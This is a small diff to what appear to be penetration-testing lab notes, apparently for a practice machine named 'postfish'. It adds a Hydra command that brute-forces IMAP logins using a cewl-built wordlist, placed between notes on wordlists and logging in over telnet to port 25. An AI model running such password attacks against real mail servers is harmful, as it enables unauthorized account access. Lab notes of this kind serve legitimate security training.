@@ -47,6 +47,8 @@ Create a custom wordlist if you find a lot of content in a web app
 
 Attack with Hydra
 
+    hydra -L validusers.txt -P cewl.txt postfish.off imap -e ns
+
 Login with
 
     telnet IP 25
